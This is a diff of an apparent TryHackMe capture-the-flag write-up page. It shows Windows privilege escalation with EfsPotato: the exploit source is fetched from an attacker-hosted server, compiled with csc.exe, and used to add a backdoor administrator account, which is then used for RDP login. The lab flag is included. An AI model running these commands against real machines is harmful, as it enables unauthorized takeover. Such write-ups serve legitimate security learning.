@@ -199,20 +199,19 @@ python3 -m http.server 80
 ```
 {% endcode %}
 
-{% code overflow="wrap" %}
-```powershell
-curl http://10.23.52.142/EfsPotato.cs -o EfsPotato.cs
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">curl http://10.23.52.142/EfsPotato.cs -o EfsPotato.cs
 
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
 
-EfsPotato.exe whoami
-
+<strong>C:\Temp\EfsPotato.exe\ whoami
+</strong>
 # add new user in the administrators group
-EfsPotato.exe "cmd.exe /c net user Antoadmin Password123! /add && net localgroup Administrators Antoadmin /add"
-```
-{% endcode %}
+EfsPotato.exe "cmd.exe /c net user Antoadmin Password123! /add &#x26;&#x26; net localgroup Administrators Antoadmin /add"
+</code></pre>
 
+<figure><img src="../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>
 
 ### RDP Access
 
@@ -220,3 +219,8 @@ EfsPotato.exe "cmd.exe /c net user Antoadmin Password123! /add && net localgroup
 xfreerdp3 /v:IP /u:Antoadmin /p:'Password123!'
 ```
 
+<figure><img src="../../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>
+
+```
+THM{101011_ADMIN_ACCESS}
+```
